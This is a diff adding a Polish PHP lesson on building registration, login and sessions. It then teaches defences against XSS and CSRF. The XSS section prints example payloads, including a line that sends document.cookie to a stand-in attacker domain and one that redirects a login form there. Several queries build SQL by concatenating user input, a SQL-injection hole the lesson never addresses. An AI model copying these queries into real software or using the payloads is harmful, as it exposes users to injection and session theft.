+    echo $action-&gt;register($_GET["username"], $_GET["login"], $_GET["pass"], $_GET["repass"]);
+}
+</code></pre>
+</section><section class="lesson-section" data-lesson-section="true"><h2>🗄️ Tworzenie bazy danych i tabeli</h2>
+<p>W pliku <code>index.php</code> zawrzemy kod który prześle do serwera bazodanowego zapytania SQL tworząc nową bazę danych <code>platforma</code> a w niej dwie tabele:</p>
+<ul>
+<li><code>users</code>: do przechowywania danych użytkowników  </li>
+<li><code>posts</code>: do przechowywania wpisów</li>
+</ul>
+<pre><code class="language-php">&lt;?php
+declare(strict_types=1);
+
+const host = "localhost";
+const user = "root";
+const password = "";
+
+$db = null;
+try {
+    $db = @new mysqli(host, user, password);
+} catch (Exception $e) {
+    echo "Błąd bazy danych: " . $e-&gt;getMessage();
+}
+$sql = 'CREATE DATABASE IF NOT EXISTS platforma;
+        CREATE TABLE IF NOT EXISTS platforma.users (
+            id INT AUTO_INCREMENT PRIMARY KEY,
+            login VARCHAR(255),
+            password VARCHAR(255),
+            username VARCHAR(255),
+            avatar TEXT,
+            role SET("user", "admin")
+        );
+        CREATE TABLE IF NOT EXISTS platforma.posts (
+            id INT AUTO_INCREMENT PRIMARY KEY,
+            author INT,
+            content VARCHAR(255)
+        );';
+$db-&gt;multi_query($sql);
+$db-&gt;close();
+
+require_once("./backend/core/router.php");
+</code></pre>
+<blockquote>
+<p>Pamiętaj by zmodyfikować połączenie mysqli inicjalizowane do zmiennej <code>$db</code> o czwarty parametr nazwy tej bazy danych.</p>
+</blockquote>
+</section><section class="lesson-section" data-lesson-section="true"><h2>🛠️ Implementacja metody rejestracji</h2>
+<p>Wracamy do klasy <code>Auth</code>. Po switchu przygotujmy zmienną z zapytaniem <code>INSERT</code>:</p>
+<pre><code class="language-php">$sql = 'INSERT INTO users 
+            (login, password, username, role)
+            VALUES(
+                "' . $login .'",
+                "' . $pass .'",
+                "' . $username .'",
+                "user"
+            )';
+</code></pre>
+<p>Na pierwszy rzut oka wszystko jest w porządku i faktycznie kod działa bez zarzutów... ALE 🤨<br>Zobacz że przechowujemy hasło jako <code>plaintext</code> (jawnie).</p>
+<img src="https://raw.githubusercontent.com/Edu-Koala-V/Courses/main/Courses/php/Images/rejestracja-udana.webp" alt="" width="1577" height="891" class="lazy-image" loading="lazy" decoding="async">
+
+
+
+<h3>#️⃣ Hashe haseł</h3>
+<p><span class="color-green">Hash</span> to funkcja matematyczna, która przyjmuje ciąg znaków o dowolnej długości i zwraca wartość o stałej długości. Przy procesie haszowania zachodzi utrata pierwotnej informacji co uniemorzliwia jej odtworzenie więc nie jest to szyfrowaniem. Jednakże poprawny algorytm hasujący przy tych samych danych wejściowych zwruci zawsze ten sam klucz hashu.</p>
+<p>$Hash("haslo", sól1) = $ but#2ga4</p>
+<p>$Hash("haslo", sól2) = $ but#2gc4</p>
+<p>$Hash("hoslo", sól1) = $ cud#2ga5</p>
+<p>Od $PHP8$ rozpoczęto ulepszanie metod powiązanych z bezpieczeństwem haseł. Celem jest odejście od algorytmu <span class="color-green">MD5</span> na rzecz <span class="color-green">Argon2</span>. Wydłużając istotnie czasy trwania ataku brute‑force przy użyciu kart graficznych i maszyn opartych o przetwarzanie GPU. Chodź <span class="color-green">Argon2</span> jest dostępny już od $PHP7.2$ to dalej trwają prace nad pełną integracją i poprawę stabilności algorytmu. Przy wydaniu $PHP8.4$ ostateczne odejście od algorytmu <span class="color-green">MD5</span> jest wdrożone. Widać to w dokumentacji że przy nowych projektach sugerowane jest użycie <span class="color-green">Argon2</span>.</p>
+<p>Możesz pozostać przy minimalnym zapisie:</p>
+<pre><code class="language-php">$pass = password_hash($pass, PASSWORD_DEFAULT);
+</code></pre>
+<p>Jednak rekomendowana forma wygląda następująco:</p>
+<pre><code class="language-php">$options = [
+    'memory_cost' =&gt; PASSWORD_ARGON2_DEFAULT_MEMORY_COST,
+    'threads' =&gt; PASSWORD_ARGON2_DEFAULT_THREADS,
+    'time_cost' =&gt; PASSWORD_ARGON2_DEFAULT_TIME_COST
+];
+$pass = password_hash($pass, PASSWORD_ARGON2ID, $options);
+</code></pre>
+<p>Dla ułatwienia pamietaj że snipety mają ci pomagać więc jeżeli wpiszesz dużymi literami <code>PASS</code> to IDE powinno samo podpowiedzieć ci dostępne opcje.</p>
+<img src="https://raw.githubusercontent.com/Edu-Koala-V/Courses/main/Courses/php/Images/ułatwienie-podawania-opcji-do-argon2.webp" alt="" width="1102" height="357" class="lazy-image" loading="lazy" decoding="async">
+
+
+
+<p>Dzięki temu brut‑force trwa znacznie dłużej a rainbow‑table staje się praktycznie bezużyteczne. </p>
+<div class="markdown-alert markdown-alert--tip">
+<p class="markdown-alert-title">
+<span class="alert-icon">✨</span> Wskazówka
+</p>
+<div class="markdown-alert-content">
+<p><span class="color-green">BRUTE‑FORCE</span> to metoda ataku mająca na celu odgadnięcie hasła poprzez systematyczne sprawdzanie wszystkich możliwych kombinacji znaków. By ją przyspieszyć proces ten jest przekazywany na karty graficzne <span class="color-green">GPU</span>. Podstawą ochrony przed atakiem brute‑force jest jak najdłuższe odwlekanie i spowalnianie go. Np.: po $3$ nieudanych próbach logowania konto jest blokowane na $15$ minut.<br><span class="color-green">RAINBOW‑TABLE</span> to tabela zawierająca hashe haseł. Jest ona używana do odgadywania haseł poprzez porównywanie hashy haseł z hashami haseł w tabeli. Bierzesz duże zbiory hashy z różnych baz danych, które wyciekły i szukasz wzorców. Podstawowa Sól stosowana automatycznie przez <code>password_hash()</code> jest wystarczająca by zablokować tęczową tabelę.</p>
+
+</div>
+</div><p>Jak faktycznie zabezpieczyć przechowywane hashe przed <span class="color-green">BRUTE‑FORCE</span>?<br>Do hasła oprócz dobrej soli należy dodać papryczkę.</p>
+<pre><code class="language-php">$pepper = $_ENV['PEPPER'];
+$pwd_peppered = hash_hmac("sha256", $password, $pepper);
+$hash = password_hash($pwd_peppered, PASSWORD_ARGON2ID);
+</code></pre>
+<p>W takim przypadku <span class="color-green">BRUTE‑FORCE</span> nie ma sensu ponieważ cyber‑przestępca musiał by poznać sól która jest w wyniku ukryta haszowania oraz papryczkę. Czyli by poznać hasło musi musi użyć jego wartość zaszyfrowaną kluczem papryczki i ten wynik użyć w hashowaniu by otrzymać ten sam hash. </p>
+<blockquote>
+<p>Pewnie zauważyłeś że w kodzie jest podana superglobalna $_ENV['PEPPER']. Jest to zmienna środowiskowa z pliku <span class="color-green">.env</span>. Jak tylko rozpoczniemy pracę przy composer'ze to wykorzystamy do niej odpowiednią bibliotekę.</p>
+</blockquote>
+<hr>
+<p>Wprowadźmy małą zmianę dotyczącą formularzy rejestracji i logowania. Jak widzisz <span class="color-blue"><code>GET</code></span> sprawia że dane są widoczne w adresie URL. Jest to problematyczne przy poufnych danych, więc zmieńmy metodę z <span class="color-blue"><code>GET</code></span> na <span class="color-green"><code>POST</code></span> w formularzach. Nie bedzie to oznaczało że dane są bezpieczniejsze, ale nie będą tak obwjus na widoku.</p>
+<img src="https://raw.githubusercontent.com/Edu-Koala-V/Courses/main/Courses/php/Images/zmienne-get-w-url.webp" alt="" width="744" height="539" class="lazy-image" loading="lazy" decoding="async">
+
+
+
+<p>Dla ułatwienia masowej edycji skorzystaj z funkcji „Znajdź i zamień”.<br>Zaznaczamy interesujący fragment np <code>$_GET</code> i używamy skrótu <kbd>Ctrl</kbd> + <kbd>F2</kbd>.</p>
+<img src="https://raw.githubusercontent.com/Edu-Koala-V/Courses/main/Courses/php/Images/zmiana-z-get-na-post.webp" alt="" width="1854" height="933" class="lazy-image" loading="lazy" decoding="async">
+
+
+
+<blockquote>
+<p>Do przełączania się miedzy zawijaniem wierszy w VS Code użyj skrótu <kbd>Alt</kbd> + <kbd>Z</kbd>.</p>
+</blockquote>
+<hr>
+<p>Na aktualnym poziomie papryczką się nie przejmujemy. Użytkownik się zarejestrował i ma poprawne dane w bazie danych <code>http://localhost/phpmyadmin/</code>:</p>
+<img src="https://raw.githubusercontent.com/Edu-Koala-V/Courses/main/Courses/php/Images/user-z-hashem-hasła-w-bd.webp" alt="" width="639" height="54" class="lazy-image" loading="lazy" decoding="async">
+
+
+
+<details>
+<summary>Aktualny stan <code>Auth.php</code></summary>
+
+<pre><code class="language-php">&lt;?php
+declare(strict_types=1);
+class Auth{
+
+    private $db;
+    function __construct(mysqli $db){
+        $this-&gt;db=$db;
+    }
+    public function register(string $username, string $login, string $pass, string $repass): string{
+        switch($this-&gt;validateRegisterData($login, $pass, $repass)){
+            case 1: return "Hasła nie są takie same.";
+            case 2: return "Ten login jest już zajęty.";
+        }
+        $options = [
+            'memory_cost' =&gt; PASSWORD_ARGON2_DEFAULT_MEMORY_COST,
+            'threads' =&gt; PASSWORD_ARGON2_DEFAULT_THREADS,
+            'time_cost' =&gt; PASSWORD_ARGON2_DEFAULT_TIME_COST
+        ];
+
+        $pass = password_hash($pass, PASSWORD_ARGON2ID, $options);
+
+        $sql = 'INSERT INTO users 
+            (login, password, username, role)
+            VALUES(
+                "' . $login .'",
+                "' . $pass .'",
+                "' . $username .'",
+                "user"
+            )';
+        $this-&gt;db-&gt;query($sql);
+        return "Rejestracja się powiodła. Możesz się już zalogować.";
+    }
+
+    private function validateRegisterData(string $login, string $pass, string $repass): int{
+        if($pass !== $repass){
+            return 1;
+        }
+        $sql='SELECT * FROM users WHERE login = "' . $login .'"';
+        $result = $this-&gt;db-&gt;query($sql);
+        if($result-&gt;num_rows !== 0){
+            return 2;
+        }
+        return 0;
+    }
+
+
+    public function login(string $login, string $pass): string{
+
+        return "Nie zaimlepmentowano jeszcze.";
+    }
+
+}
+</code></pre>
+</details>
+
+</section><section class="lesson-section" data-lesson-section="true"><h2>🛠️ Implementacja metody logowania</h2>
+<p>Rejestracja gotowa, więc czas na zaimplementowanie logowania.</p>
+<p>Na podstawie loginu wyszukamy cza danu użytkownik istnieje, a jak tak to dopiero wtedy bedziemy działać dalej z weryfikacją poprawności podanego hasła.</p>
+<p>Standardowo przygotowujemy zapytanie SQL spreparowane zmienną wysyłamy do bazy danych i w pierwszym kroku sprowadzamy ile jest wyników.</p>
+<p>Jeżeli z zapytania mamy krotkę to pole o atrybucie <code>password</code> przekazujemy wraz z inputem hasła użytkownika do prywatnej funkcji pomocniczej, która zdecyduje czy wartości obu argumentów są tożsame.</p>
+<pre><code class="language-php">    public function login(string $login, string $pass): string
+    {
+        $sql = 'SELECT * FROM users WHERE login="' . $login . '"';
+        $result = $this-&gt;db-&gt;query($sql);
+
+        if ($result-&gt;num_rows == 0) {
+            return "Podano niepoprawne dane.";
+        }
+
+        $this-&gt;validatePasswordHash($pass, $result-&gt;fetch_assoc()["password"]);
+
+        return "Nie zaimlepmentowano jeszcze.";
+    }
+    private function validatePasswordHash($passInput, $passHash)
+    {
+        
+    }
+</code></pre>
+<p>Zobacz że na poniższym obrazku metody <code>validateRegisterData()</code> i <code>login()</code> mają praktycznie identyczny blok kodu, wiec warto go wyekstrahować do osobnej funkcji.</p>
+<img src="https://raw.githubusercontent.com/Edu-Koala-V/Courses/main/Courses/php/Images/początkowa-implementacja-logowania.webp" alt="" width="1833" height="986" class="lazy-image" loading="lazy" decoding="async">
+
+
+
+<div class="markdown-alert markdown-alert--important">
+<p class="markdown-alert-title">
+<span class="alert-icon">📌</span> Ważny punkt
+</p>
+<div class="markdown-alert-content">
+<p>Zadanie dla Ciebie!<br>Dokonaj refaktoryzacji metod <code>validateRegisterData()</code> i <code>login()</code> wytwarzając nową prywatną metodę z której będą one korzystać, tak by nie zmienić nic w metodzie <code>register</code>. Zacznij od takiej deklaracji:</p>
+<pre><code class="language-php">private function getDataAsLogin(string $login): array {
+    
+}
+</code></pre>
+
+</div>
+</div><details>
+<summary>Rozwiązanie powyższej refaktoryzacji</summary>
+
+<pre><code class="language-php">    private function validateRegisterData(string $login, string $pass, string $repass): int
+    {
+        if ($pass !== $repass) {
+            return 1;
+        }
+
+        $result = $this-&gt;getDataAsLogin($login);
+
+        if (count($result) !== 0) {
+            return 2;
+        }
+
+        return 0;
+    }
+    private function getDataAsLogin(string $login): array
+    {
+        $sql = 'SELECT * FROM users WHERE login = "' . $login . '"';
+        $result = $this-&gt;db-&gt;query($sql);
+
+        if ($result-&gt;num_rows == 0) {
+            return [];
+        }
+
+        return $result-&gt;fetch_assoc();
+    }
+    public function login(string $login, string $pass): string
+    {
+        $result = $this-&gt;getDataAsLogin($login);
+        if (count($result) == 0) {
+            return "Podano niepoprawne dane.";
+        }
+
+        if (!$this-&gt;validatePasswordHash($pass, $result["password"])) {
+            return "Podano nieprawidłowe hasło";
+        }
+
+        return "Logowanie się powiodło";
+    }
+</code></pre>
+<img src="https://raw.githubusercontent.com/Edu-Koala-V/Courses/main/Courses/php/Images/refaktoryzacja-auth-metod-pomocniczych-do-loginu.webp" alt="" width="1843" height="932" class="lazy-image" loading="lazy" decoding="async">
+
+
+
+</details>
+
+<h3>🔬 Walidacja wpisanego hasła z hashem</h3>
+<p>Dokonczymy naszą prywatną metodę <code>validatePasswordHash</code> i wykorzystajmy do tego celu wbudowaną funkcje <code>password_verify()</code>.</p>
+<p>Jej działanie jest proste, przyjmuje dwa parametry, pierwszy to wpisane hasło przez użytkownika, drugi to hash zapisany w bazie danych. Zwraca true jeśli hasło jest poprawne, false w przeciwnym wypadku. </p>
+<pre><code class="language-php">var_dump(password_verify($passInput, $passHash));
+</code></pre>
+<blockquote>
+<p>Pamietamy że PHP lubi nie wyświetlić w zwracanej stronie typu <code>text\html</code> wartości dla zmiennych Boolowskich, więc należy użyć var_dump.</p>
+</blockquote>
+<img src="https://raw.githubusercontent.com/Edu-Koala-V/Courses/main/Courses/php/Images/implementacja-password_verify.webp" alt="" width="1840" height="815" class="lazy-image" loading="lazy" decoding="async">
+
+
+
+
+<p>Całe logowanie aktualnie opiera się o te dwie metody:</p>
+<pre><code class="language-php">public function login(string $login, string $pass): string{
+    $result = $this-&gt;getDataAsLogin($login);
+    if (count($result) == 0) {
+        return "Podano niepoprawne dane.";
+    }
+
+    if (!$this-&gt;validatePasswordHash($pass, $result["password"])) {
+        return "Podano nieprawidłowe hasło";
+    }
+
+    return "Logowanie się powiodło";
+}
+private function validatePasswordHash(string $passInput, string $passHash): bool{
+    return password_verify($passInput, $passHash);
+}
+</code></pre>
+<p>Realnie nasz system dodaje użytkownika do bazy danych i potrafi sprawdzić czy istnieje w niej ktoś z takim loginem i hasłem.<br>Dla klienta końcowego to dalej za mało.</p>
+</section><section class="lesson-section" data-lesson-section="true"><h2>🔰 Widok strony względem stanu zalogowania</h2>
+<p>Formularze rejestracji i logowania powinny być widoczne dla niezalogowanych w innym przypadku klient powinien zobaczyć opcję wylogowania się.</p>
+<p>Wytnijmy więc z pliku <code>login.html</code> cały tag <code>&lt;header&gt;</code> i umieścimy go w nowym pliku <code>register_login_section.html</code>, a miejsce w którym się znajdował zastąpimy <code>%%register_login_section%%</code>.</p>
+<p>Nasz <code>case "/":</code> w pliku <code>router.php</code> będzie wyglądał tak:</p>
+<pre><code class="language-php">$loginPage = file_get_contents("./backend/views/login.html");
+$register_login_section = file_get_contents("./backend/views/register_login_section.html");
+
+$loginPage = str_replace("%%register_login_section%%", $register_login_section, $loginPage);
+
+echo $loginPage;
+</code></pre>
+<p>Nic się nie zmieniło, to dobrze.</p>
+<img src="https://raw.githubusercontent.com/Edu-Koala-V/Courses/main/Courses/php/Images/preparacja-strony-login.webp" alt="" width="1848" height="925" class="lazy-image" loading="lazy" decoding="async">
+
+
+
+<h3>🗃️ Sesja użytkownika</h3>
+<p>Aktualnie nasz użytkownik może się zalogować, ale nic się nie dzieje. Musimy skorzystać z mechanizmu sesji.</p>
+<p>Jeżeli w danym pliku PHP wywołamy funkcje <code>session_start()</code>, PHP rozpocznie nową sesję lub połączy nas z istniejącą. By PHP wiedziała że dane z sesji są powiązane z konkretnym klientem czyli przeglądarką wysyła do niej ciasteczko <span class="color-green">PHPSESSID</span>,które to w kolejnych żądaniach będzie doklejane.</p>
+<img src="https://raw.githubusercontent.com/Edu-Koala-V/Courses/main/Courses/php/Images/session_start-i-ciasteczko-PHPSESSID.webp" alt="" width="1609" height="383" class="lazy-image" loading="lazy" decoding="async">
+
+
+
+<p>Dzieki temu możemy zdecydować który wariant strony ma zostać wyświetlony:</p>
+<ul>
+<li>wariant z formularzami rejestracji i logowania</li>
+<li>wariant z powitaniem</li>
+</ul>
+<p>W <code>Auth-&gt;login()</code> przed zwruceniem pozytywnego komunkatu przez return na koniec metody zapiszmy resultad zapytania sql by przechwycić dane o użytkowniku.</p>
+<pre><code class="language-php">$_SESSION["user"] = $result;
+return "Logowanie się powiodło";
+</code></pre>
+<p>Następnie zastąpmy standardowe użycie <code>echo</code> dla wyników metod <code>register()</code> i <code>login()</code> w pliku <code>router.php</code> przypisując je do zmiennych.</p>
+<p>Oraz w pliku <code>register_login_section.html</code> pod przyciskami formularzy w znaczniku <code>&lt;p&gt;</code> dopiszmy „haczyki” dla <span class="color-gold"><code>str_replace()</code></span>.</p>
+<p>Wtedy w <code>case "/":</code> zapisujemy $3$ <span class="color-gold"><code>if else</code></span> sprawdzające istnienie:</p>
+<ul>
+<li>komunikatu rejestracji,</li>
+<li>komunikatu logowania,</li>
+<li>danych użytkownika.</li>
+</ul>
+<p>Na tej podstawie kod decyduje czy w miejscu "haczyka" wstawiamy jakąś wartość czy zastępujemy go pustym ciągiem znaków <code>""</code> (empty).</p>
+<img src="https://raw.githubusercontent.com/Edu-Koala-V/Courses/main/Courses/php/Images/strona-po-zalogowaniu-z-ciasteczkiem-sessji.webp" alt="" width="1845" height="918" class="lazy-image" loading="lazy" decoding="async">
+
+
+
+<blockquote>
+<p>Odśwież sobie pare razy stronę i zobacz że w nagłówkach żądania zawsze pojawia się ciasteczko <code>PHPSESSID</code> o tym samym identyfikatorze.</p>
+</blockquote>
+</section><section class="lesson-section" data-lesson-section="true"><h2>🔴 Atak XSS (Cross-Site Scripting)</h2>
+<p><span class="color-green">XSS</span> (<span class="color-blue">Cross‑Site Scripting</span>, skrót zapisywany jako <span class="color-blue">XSS</span>, aby nie mylić go z arkuszami stylów <span class="color-blue">CSS</span>) to jeden z najczęstszych i najgroźniejszych ataków w aplikacjach webowych według <span class="color-green">OWASP Top 10</span>. </p>
+<p>Polega na <span class="color-green">wstrzyknięciu złośliwego kodu JavaScript</span> do struktury strony HTML. Kod ten jest następnie przesyłany z serwera i <span class="color-green">wykonywany w przeglądarce innego użytkownika</span> (często administratora lub zwykłego klienta serwisu), który odwiedza zainfekowaną stronę.</p>
+<div class="markdown-alert markdown-alert--caution">
+<p class="markdown-alert-title">
+<span class="alert-icon">❗</span> Ostrożnie
+</p>
+<div class="markdown-alert-content">
+<p>Przeglądarka internetowa nie wie, które fragmenty odebranego kodu HTML zostały napisane przez twórcę strony, a które wpisał złośliwy użytkownik w formularzu. Jeśli w kodzie znajdzie się tag <code>&lt;script&gt;</code> lub zdarzenie JavaScript, przeglądarka po prostu <span class="color-green">bezrefleksyjnie go wykona</span> w kontekście zalogowanego użytkownika!</p>
+
+</div>
+</div><hr>
+<h3>🔎 Rodzaje ataków XSS</h3>
+<table>
+<thead>
+<tr>
+<th align="left">Typ ataku</th>
+<th align="left">Nazwa angielska</th>
+<th align="left">Opis działania</th>
+<th align="left">Poziom zagrożenia</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><span class="color-green">Trwały (Zapisany)</span></td>
+<td align="left"><span class="color-blue">Stored / Persistent XSS</span></td>
+<td align="left">Złośliwy skrypt zostaje <span class="color-green">zapisany na stałe w bazie danych</span> (np. w nazwie użytkownika, treści komentarza czy posta). Każdy, kto wyświetli daną podstronę, automatycznie odpala skrypt.</td>
+<td align="left">🔴 Krytyczny</td>
+</tr>
+<tr>
+<td align="left"><span class="color-green">Odbity</span></td>
+<td align="left"><span class="color-blue">Reflected XSS</span></td>
+<td align="left">Skrypt jest przekazywany w żądaniu (np. jako parametr w linku URL <code>?search=&lt;script&gt;...</code>) i natychmiast „odbijany” przez serwer w odpowiedzi HTML.</td>
+<td align="left">🟠 Wysoki</td>
+</tr>
+<tr>
+<td align="left"><span class="color-green">Oparty na DOM</span></td>
+<td align="left"><span class="color-blue">DOM‑based XSS</span></td>
+<td align="left">Podatność występuje bezpośrednio w kodzie JavaScript po stronie klienta (np. skrypt JS odczytuje hash URL i niebezpiecznie wstawia go przez <code>innerHTML</code>).</td>
+<td align="left">🟡 Średni / Wysoki</td>
+</tr>
+</tbody></table>
+<hr>
+<h3>😱 Aktualnie nasz kod jest na to podatny!</h3>
+<p>Nasze metody  rejestracji i logowania nie weryfikują czy nazwa użytkownika jest bezpiecznym ciągiem znaków.<br>Zobacz co się stanie gdy zarejestrujemy się używając poniższej frazy jako nazwy użytkownika:</p>
+<pre><code class="language-html">&lt;script&gt;alert('Twoja strona jest podatna na XSS!');&lt;/script&gt;
+</code></pre>
+<p>Teraz za każdym razem gdy na stronie bedzie wyświetlana nazwa tego użytkownika, przeglądarka będzie wyświetlała wyskakujące okienko z komunikatem: „Twoja strona jest podatna na XSS!”.</p>
+<img src="https://raw.githubusercontent.com/Edu-Koala-V/Courses/main/Courses/php/Images/test-podatności-XSS-1.webp" alt="" width="1087" height="680" class="lazy-image" loading="lazy" decoding="async">
+
+
+
+<p>Co dzieje się dalej?</p>
+<ol>
+<li>Baza danych zapisuje ten tekst dosłownie.</li>
+<li>Gdy inny użytkownik otwiera stronę z wpisami, serwer PHP generuje kod HTML:<pre><code class="language-html">&lt;small&gt;&lt;script&gt;alert('Twoja strona jest podatna na XSS!');&lt;/script&gt;&lt;/small&gt;
+</code></pre>
+</li>
+<li>Przeglądarka ofiary parsuje tag <code>&lt;script&gt;</code> i wyświetla wyskakujące okno <code>alert()</code>.</li>
+</ol>
+<p>Jednak standardowy <code>alert()</code> to zwykły trolling. Gorzej jeżeli cyber‑przestępca wpisze poniższy kod:</p>
+<pre><code class="language-js">document.querySelector("form[action='/login']").setAttribute("action","https://domena-kryminalna.pl/xss") 
+</code></pre>
+<p>Infekcja spowoduje że dane logowania z formularza nie trafią na nasz backend tylko zupełnie gdzie indziej. Do tego request przekaże je w sposób całkowicie jawny.</p>
+<img src="https://raw.githubusercontent.com/Edu-Koala-V/Courses/main/Courses/php/Images/test-podatności-XSS-2.webp" alt="" width="1091" height="873" class="lazy-image" loading="lazy" decoding="async">
+
+
+
+<p>Jednak najgorszą sytuacją jest ta gdy cyberprzestępca przechwyci ciasteczko <span class="color-green">PHPSESSID</span>.<br>Jeżeli przestepca użył by takiego kodu:</p>
+<pre><code class="language-js">new Image().src = 'http://domena-kryminalisty.com/log.php?data=' + encodeURIComponent(document.cookie); 
+</code></pre>
+<p>Może przesłać na swój serwer identyfikator sesji ofiary:</p>
+<img src="https://raw.githubusercontent.com/Edu-Koala-V/Courses/main/Courses/php/Images/test-podatności-XSS-3.webp" alt="" width="1919" height="925" class="lazy-image" loading="lazy" decoding="async">
+
+
+
+<p>Jak dobrze pamiętasz ciasteczko <span class="color-green">PHPSESSID</span> posiada identyfikator po którym PHP wie z kim gada. Wystarczy je u siebie podmieniać i po odświeżeniu zalogowaliśmy się bez znajomości loginu i hasła ofiary.</p>
+<img src="https://raw.githubusercontent.com/Edu-Koala-V/Courses/main/Courses/php/Images/test-podatności-XSS-3-efekt.webp" alt="" width="1919" height="1032" class="lazy-image" loading="lazy" decoding="async">
+
+
+
+<h3>🔒 Zabezpieczenie metod przed XSS</h3>
+<p>Skoro już wiesz jak banalny w użyciu jest atak XSS to pewnie rozumiesz że nie warto ufać użytkownikom.</p>
+<p>Dlatego gdy cokolwiek od nich otrzymamy musimy potraktować jako ciąg znaków i część z nich zapisać jako <a href="https://www.w3schools.com/html/html_entities.asp">HTML Entities</a>:</p>
+<pre><code class="language-php">htmlspecialchars($value, ENT_QUOTES, 'UTF-8');
+</code></pre>
+<p>Wszelkie ustawienia tej funkcji możesz sprawdzić w <a href="https://www.php.net/htmlspecialchars">dokumentacji PHP</a>. Jednak powyższe jest najszersze w konwersji na zapis encji HTML i z <code>UTF-8</code>, który obejmuje wszystkie języki europejskie.</p>
+<p>Napiszmy teraz nową prywatną metodę pomocniczą dodając lekką warstwę abstrakcji na kod:</p>
+<pre><code class="language-php">private function unsetXSS(string &amp;$value): void {
+    $value = htmlspecialchars($value, ENT_QUOTES, 'UTF-8');
+}
+</code></pre>
+<blockquote>
+<p>Powyższa metoda przyjmuje referencję do zmiennej stąd zastosowanie <code>&amp;</code>. Dzieki czemu nie bedzie konieczności przesyłania kopi każdej zmiennej i nadpisywania jej wynikiem. Wystarczy tak jak poniżej wywołać metodę przekazując dany parametr jako oryginał a nie kopię:</p>
+</blockquote>
+<pre><code class="language-php">public function register(string $username, string $login, string $pass, string $repass): string
+{
+    $this-&gt;unsetXSS($username);
+    $this-&gt;unsetXSS($login);
+    $this-&gt;unsetXSS($pass);
+    $this-&gt;unsetXSS($repass);
+
+    // ... reszta kodu bez zmian
+}
+
+public function login(string $login, string $pass): string
+{
+    $this-&gt;unsetXSS($login);
+    $this-&gt;unsetXSS($pass);
+    
+    // ... reszta kodu bez zmian
+}
+</code></pre>
+<blockquote>
+<p>Zabezpieczenie wartości przekazanych z pól formularza wymagane jest w sumie tylko w tych dwóch powyższych metodach, ponieważ kolejne metody pomocnicze dostaną już oczyszczone wartości.</p>
+</blockquote>
+<h3>🍪 Dodatkowe warstwy obrony ciasteczka sesji</h3>
+<p>Oprócz funkcji <code>htmlspecialchars()</code> warto odgórnie zwiekszyć zasady komunikacji miedzy klientem przeglądarki a PHP. Mianowicie zmodyfikujmy konfigurację pliku  <code>src/Infrastructure/Sessions/PHPSession.php</code>:</p>
+<pre><code class="language-php">// Konfiguracja bezpiecznej sesji przed jej wystartowaniem
+session_set_cookie_params([
+    'lifetime' =&gt; 0,     // czas wygaśnięcia ciasteczka (0 = do momentu zamknięcia przeglądarki)
+    'path' =&gt; '/',     // ciasteczko działa na całej domenie, którą zapisano w 'domain'
+    'domain' =&gt; '',     // puste (empty) oznacza żę dla TEJ AKTUALNEJ domeny na której działa PHP. Alternatywnie możesz podać subdomenę
+    'secure' =&gt; true,     // Ciasteczko przesyłane tylko przez szyfrowane połączenie HTTPS
+    'httponly' =&gt; true,   // Blokada dostępu dla JavaScriptu (ochrona przed kradzieżą sesji)
+    'samesite' =&gt; 'Lax'   // Częściowa, wręcz podstawowa ochrona przed atakami CSRF
+]);
+session_start();
+</code></pre>
+<div class="markdown-alert markdown-alert--note">
+<p class="markdown-alert-title">
+<span class="alert-icon">💬</span> Notatka
+</p>
+<div class="markdown-alert-content">
+<p>Domena to adres DNS składający się z nazwy głównej wymyślonej przez właściciela i jednego z dostępnych rozszerzeń (np. .pl, .com). Na przykład: <code>google.com</code>, <code>wikipedia.org</code>, <code>gov.pl</code>, <code>ciemnastrona.com.pl</code>.<br>Subdomena to <span class="color-green">poddomena</span> jest to nazwa dodana do domeny głównej. Na przykład: <code>mail.google.com</code>, <code>forum.pasjonaci-wendkarstwa.pl</code>.</p>
+
+</div>
+</div><blockquote>
+<p>Przeglądarki i aplikacje internetowe pracują na <code>http:80</code> lub <code>https:443</code>. Dopisana literka <code>s</code> odnosi się do <span class="color-blue">secure</span> co jest związane z szyfrowaniem <code>SSL/TLS</code>. Najprościej mówiąc podczas komunikacji miedzy serwerem a klientem gdy operujemy na <code>https</code> to pakiety opuszczając przeglądarkę lub usługę Apache/Nginix to są już zaszyfrowane i takie wędrują przez sieć.<br>Natomiast gdy pracujemy na <code>http</code> to szyfrowanie zawartości pakietu nigdy nie następuje i można taki pakiet przechwycić i odczytać jako tekst jawny.</p>
+</blockquote>
+<img src="https://raw.githubusercontent.com/Edu-Koala-V/Courses/main/Courses/php/Images/zabezpieczenie-ciasteczka-PHPSESSID.webp" alt="" width="1158" height="575" class="lazy-image" loading="lazy" decoding="async">
+
+
+
+<div class="markdown-alert markdown-alert--warning">
+<p class="markdown-alert-title">
+<span class="alert-icon">🚧</span> Uwaga
+</p>
+<div class="markdown-alert-content">
+<p><code>samesite</code> ma dwa możliwe parametry do ustawienia:</p>
+<ul>
+<li><code>Lax</code> - Ciasteczka nie są wysyłane przy zapytaniach na inne domeny z wyjątkiem żądań <span class="color-blue"><code>GET</code></span>.</li>
+<li><code>Strict</code> - Ciasteczko <span class="color-red">NIE JEST W OGÓLE</span> wysyłane na inne domeny. Powoduje to całkowitą niemożność implementacji <code>OAuth</code> czyli logowania przy pomocy np. konta google do twojego serwisu.</li>
+</ul>
+
+</div>
+</div></section><section class="lesson-section" data-lesson-section="true"><h2>🔴 Atak CSRF</h2>
+<p>Ten rodzaj ataku jest ślepy. Polega na stworzeniu szemranej strony WwW cyber‑przestępcy na której wywoływana jest akcja wysłania żądania <span class="color-green"><code>POST</code></span> do innej strony wykorzystując ciasteczko sessji tamtej strony by się uwiarygodnić i wykonać daną akcję. Alternatywnie można stworzyć link do akcji z parametrami w adresie URL (metoda <span class="color-blue"><code>GET</code></span>). Wtedy ofiara klikając go mówi przeglądarce że chce wykonać tą akcję.</p>
+<h3>🔒 Zabezpieczenie przed CSRF</h3>
+<p>By się przed tym ustrzec należy po utworzeniu sesji PHP wygenerować po stronie serwera losowy ciąg znaków i np.: umieścić go w superglobalnej <code>$_SESSION</code>: </p>
+<pre><code class="language-php">if (!isset($_SESSION['csrf_token'])) {
+    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
+}
+&gt; Jeżeli token nie istnieje to generujemy losowe $32$ bajty. Ptem z nich robimy $64$ znakowy `string` konwertując bajty na zapis szesnastkowy. Ten `string` jest przechowywany w `$_SESSION['csrf_token']` i tylko serwer go zna.
+</code></pre>
+<p>W klasie <code>Auth</code> tworzymy kolejną, tym razem publiczną metodę do walidacji poprawności tokenu:</p>
